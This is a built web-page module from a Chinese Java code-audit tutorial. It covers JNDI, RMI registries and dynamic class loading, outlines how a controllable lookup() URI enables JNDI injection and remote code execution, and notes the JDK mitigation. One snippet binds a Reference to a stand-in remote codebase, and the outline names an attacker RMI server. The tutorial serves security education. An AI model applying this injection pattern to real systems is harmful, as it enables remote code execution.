import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,b as t,o as e}from"./app-vU8izl1I.js";const p="/DailyNotes/assets/v2-35c818d345e4f2855a61c72ef99944bb_r-_3b_4Gko.jpg",o="/DailyNotes/assets/v2-3f8e3efe36ae829f20345720e0f97113_r-DcQEwWtF.jpg",c="/DailyNotes/assets/v2-4d7997d41a1a1b86b9199698750d664f_720w-BmRAz6-t.webp",i={};function l(r,n){return e(),s("div",null,[...n[0]||(n[0]=[t('<h1 id="_4-java-代码审计基础-jndi" tabindex="-1"><a class="header-anchor" href="#_4-java-代码审计基础-jndi"><span>4-Java 代码审计基础-JNDI</span></a></h1><h2 id="jndi-简介" tabindex="-1"><a class="header-anchor" href="#jndi-简介"><span>JNDI 简介</span></a></h2><p><strong>JNDI(Java Naming and Directory Interface)<strong>是一个应用程序设计的 API，为开发人员提供了</strong>查找和访问各种命名和目录服务</strong>的通用、统一的接口（类似 JDBC 都是构建在抽象层上）。现在 JNDI 已经成为 J2EE 的标准之一，所有的 J2EE 容器都必须提供一个 JNDI 的服务。</p><p>**命名服务：**将 Java 对象以某个名称的形式绑定（binding）到一个容器环境（Context）中，以后调用容器环境（Context）的查找（lookup）方法又可以查找出某个名称所绑定的 Java 对象。简单来说，就是把一个 Java 对象和一个特定的名称关联在一起，方便容器后续使用。</p><p>**目录服务：**将一个对象的所有属性信息保存到一个容器环境中。JNDI 的目录（Directory）原理与 JNDI 的命名（Naming）原理非常相似，主要的区别在于目录容器环境中保存的是对象的属性信息，而不是对象本身。举个例子，Name 的作用是在容器环境中绑定一个 Person 对象，而 Directory 的作用是在容器环境中保存这个 Person 对象的属性，比如说 age=10，name=小明等等。实际上，二者往往是结合在一起使用的</p><p><strong>JNDI 可访问的现有的目录及服务有：</strong> DNS、XNam 、Novell 目录服务、LDAP(Lightweight Directory Access Protocol 轻型目录访问协议)、 CORBA 对象服务、文件系统、Windows XP/2000/NT/Me/9x 的注册表、RMI、DSML v1&amp;v2、NIS。其中<strong>LDAP、RMI</strong>经常被利用，进行 JNDI 注入攻击。</p><p><code>JNDI</code>默认支持自动转换的协议：</p><table><thead><tr><th>协议名称</th><th>协议 URL</th><th>Context 类</th></tr></thead><tbody><tr><td>DNS 协议</td><td><code>dns://</code></td><td><code>com.sun.jndi.url.dns.dnsURLContext</code></td></tr><tr><td>RMI 协议</td><td><code>rmi://</code></td><td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td></tr><tr><td>LDAP 协议</td><td><code>ldap://</code></td><td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td></tr><tr><td>LDAP 协议</td><td><code>ldaps://</code></td><td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td></tr><tr><td>IIOP 对象请求代理协议</td><td><code>iiop://</code></td><td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td></tr><tr><td>IIOP 对象请求代理协议</td><td><code>iiopname://</code></td><td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td></tr><tr><td>IIOP 对象请求代理协议</td><td><code>corbaname://</code></td><td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td></tr></tbody></table><h2 id="rmi-机制" tabindex="-1"><a class="header-anchor" href="#rmi-机制"><span>RMI 机制</span></a></h2><p>RMI（Remote Method Invocation）是专为 Java 环境设计的远程方法调用机制，远程服务器实现具体的 Java 方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。</p><h3 id="_1-远程对象调用" tabindex="-1"><a class="header-anchor" href="#_1-远程对象调用"><span>1. 远程对象调用</span></a></h3><p>任何可以被远程调用方法的对象必须实现 <code>java.rmi.Remote</code> 接口，远程对象的实现类必须继承<code>UnicastRemoteObject</code>类（如果不继承，则需要手工初始化远程对象）</p><p>在 JVM 之间通信时，RMI 并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的 Stub，Stub 基本上相当于是远程对象的引用或者代理。Stub 中包含了远程对象的定位信息，如 Socket 端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以 RMI 远程调用逻辑是这样的：</p><figure><img src="'+p+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>从逻辑上来看，数据是在 Client 和 Server 之间横向流动的，但是实际上是从 Client 到 Stub，然后从 Skeleton 到 Server 这样纵向流动的。</p><ol><li>Server 端监听一个端口，这个端口是 JVM 随机选择的；</li><li>Client 端并不知道 Server 远程对象的通信地址和端口，但是 Stub 中包含了这些信息，并封装了底层网络操作；</li><li>Client 端可以调用 Stub 上的方法；</li><li>Stub 连接到 Server 端监听的通信端口并提交参数；</li><li>远程 Server 端上执行具体的方法，并返回结果给 Stub；</li><li>Stub 返回执行结果给 Client 端，从 Client 看来就好像是 Stub 在本地执行了这个方法一样。</li></ol><h3 id="_2-rmi-注册表" tabindex="-1"><a class="header-anchor" href="#_2-rmi-注册表"><span>2. RMI 注册表</span></a></h3><blockquote><p>怎么获取 Stub 呢</p></blockquote><p>使用 RMI Registry 之后，RMI 的调用关系是这样的：</p><figure><img src="'+o+`" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>所以其实从客户端角度看，服务端应用是有两个端口的，一个是 RMI Registry 端口（默认为 1099），另一个是远程对象的通信端口（随机分配的）。</p><p>具体实现方法如下：<strong>RMIServer</strong></p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServerTest</span> <span class="token punctuation">{</span>

	   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">RMI_NAME</span> <span class="token operator">=</span> <span class="token string">&quot;rmi://127.0.0.1:12345/test&quot;</span><span class="token punctuation">;</span>

	   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	      <span class="token keyword">try</span> <span class="token punctuation">{</span>
	         <span class="token comment">// 注册RMI端口</span>
	         <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	         <span class="token comment">// 绑定Remote对象</span>
	         <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token constant">RMI_NAME</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">RMITestImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	         <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;RMI服务启动成功,服务地址:&quot;</span> <span class="token operator">+</span> <span class="token constant">RMI_NAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	         e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	      <span class="token punctuation">}</span>
	   <span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre><p><strong>RMIClient：</strong></p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClientTest</span> <span class="token punctuation">{</span>

	 <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	      <span class="token keyword">try</span> <span class="token punctuation">{</span>
	         <span class="token comment">// 查找远程RMI服务</span>
			  <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			  <span class="token class-name">RMITestInterface</span> rt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMITestInterface</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	         <span class="token comment">// 调用远程接口RMITestInterface类的test方法</span>
	         <span class="token class-name">String</span> result <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	         <span class="token comment">// 输出RMI方法调用结果</span>
	         <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
	      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	         e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	      <span class="token punctuation">}</span>
	   <span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre><p><strong>bind()方法的作用是将名称绑定到对象里面，lookup()方法的作用是通过名字检索执行的对象，其中当 lookup()方法的参数可控时，攻击者就可以将恶意的 url 传入参数加载恶意的类。</strong></p><h3 id="_3-动态加载类" tabindex="-1"><a class="header-anchor" href="#_3-动态加载类"><span>3. 动态加载类</span></a></h3><blockquote><p>JNDI 注入的利用方法中也借助了动态加载类的思路</p></blockquote><p>RMI 核心特点之一就是动态类加载，如果当前 JVM 中没有某个类的定义，它可以从远程 URL 去下载这个类的 class，动态加载的对象 class 文件可以使用 Web 服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI 注册表上可以动态的加载绑定多个 RMI 应用。</p><p>对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的 class 文件，如果需要客户端正确调用这些子类中被重写的方法，则需要有运行时动态加载额外类的能力。</p><p>使用了与 RMI 注册表相同的机制，RMI 服务端将 URL 传递给客户端，客户端通过 HTTP/HTTPS 请求下载这些类。</p><p>这里涉及到的角色：客户端、RMI 注册表、远程对象服务器、托管 class 文件的 Web 服务器可以分别位于不同的主机上：</p><figure><img src="`+c+`" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>根据 Reference 实例动态加载类</strong></p><p>在上文远程对象调用部分知道，客户端获取了远程对象后所执行的此对象的方法，都是由 RMI 服务器来执行的。但是想要利用 RMI 进行攻击，需要控制恶意代码在客户端执行，此时就需要 Reference 类，创建一个对象 Reference 并将其绑定到 RMI 服务器上。例如：</p><pre><code class="language-java"><span class="token comment">// 假设定义好了registry，见前节</span>
<span class="token class-name">Reference</span> refObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;refClassName&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;factoryName&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://a.com:12345&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ReferenceWrapper</span> refObjWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>refObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;refObj&quot;</span><span class="token punctuation">,</span> refObjWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><p>对于 RMI 服务器而言，向客户端传回一个 Reference 对象和传回其他对象并没有多大区别。</p><p>客户端由于获取到了一个 Reference 实例，比如说就是上面代码中的 Reference 实例，接下来客户端就会先在 CLASSPATH 里寻找被标识为 refClassName 的类。如果没找到，它就会去请求http://a.com:12345/refClassName.class 对里面的类进行动态加载，并调用 insClassName 类的构造方法。</p><blockquote><p>注意，调用 insClassName 类的构造方法这个行为是由<strong>客户端</strong>完成的。</p></blockquote><h2 id="jndi-注入之-rmi" tabindex="-1"><a class="header-anchor" href="#jndi-注入之-rmi"><span>JNDI 注入之 RMI</span></a></h2><p>绑定了 Reference 之后，服务端会先通过 Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在 lookup()查找这个远程对象时，客户端会获取相应的 object factory，最终通过 factory 类将 reference 转换为具体的对象实例。</p><p>整个利用流程如下：</p><ol><li>目标代码中调用了 InitialContext.lookup(URI)，且 URI 为用户可控；</li><li>攻击者控制 URI 参数为恶意的 RMI 服务地址，如：rmi://hacker_rmi_server//name；</li><li>攻击者 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定某个精心构造的 Factory 类；</li><li>目标在进行 lookup()操作时，会动态加载并实例化 Factory 类，接着调用 factory.getObjectInstance()获取外部远程对象实例；</li><li>攻击者可以在 Factory 类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到 RCE 的效果；</li></ol><p>JDK 6u141, JDK 7u131, JDK 8u121 以及更高版本中 Java 提升了 JNDI 限制了 Naming/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性，所以会执行以上流程会有如下报错</p><pre><code class="language-javascript">The object factory is untrusted<span class="token punctuation">.</span> Set the system property <span class="token string">&#39;com.sun.jndi.rmi.object.trustURLCodebase&#39;</span> to <span class="token string">&#39;true&#39;</span><span class="token punctuation">.</span>
</code></pre><p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。</p>`,46)])])}const d=a(i,[["render",l]]),m=JSON.parse('{"path":"/CodeAudittutorial/1-JavaBase/4-JNDI.html","title":"4-Java 代码审计基础-JNDI","lang":"zh-CN","frontmatter":{"category":"代码审计","tag":"Java","description":"4-Java 代码审计基础-JNDI JNDI 简介 JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口（类似 JDBC 都是构建在抽象层上）。现在 JNDI 已经成为 J2EE 的标准之一，所有的 J2EE 容器都必须提供一个 ...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/4-JNDI.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"4-Java 代码审计基础-JNDI"}],["meta",{"property":"og:description","content":"4-Java 代码审计基础-JNDI JNDI 简介 JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口（类似 JDBC 都是构建在抽象层上）。现在 JNDI 已经成为 J2EE 的标准之一，所有的 J2EE 容器都必须提供一个 ..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"Java"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"4-Java 代码审计基础-JNDI\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"JNDI 简介","slug":"jndi-简介","link":"#jndi-简介","children":[]},{"level":2,"title":"RMI 机制","slug":"rmi-机制","link":"#rmi-机制","children":[{"level":3,"title":"1. 远程对象调用","slug":"_1-远程对象调用","link":"#_1-远程对象调用","children":[]},{"level":3,"title":"2. RMI 注册表","slug":"_2-rmi-注册表","link":"#_2-rmi-注册表","children":[]},{"level":3,"title":"3. 动态加载类","slug":"_3-动态加载类","link":"#_3-动态加载类","children":[]}]},{"level":2,"title":"JNDI 注入之 RMI","slug":"jndi-注入之-rmi","link":"#jndi-注入之-rmi","children":[]}],"git":{"createdTime":1703388937000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":7}]},"readingTime":{"minutes":7.09,"words":2127},"filePathRelative":"CodeAudittutorial/1-JavaBase/4-JNDI.md","localizedDate":"2023年12月24日","excerpt":"\\n","autoDesc":true}');export{d as comp,m as data};
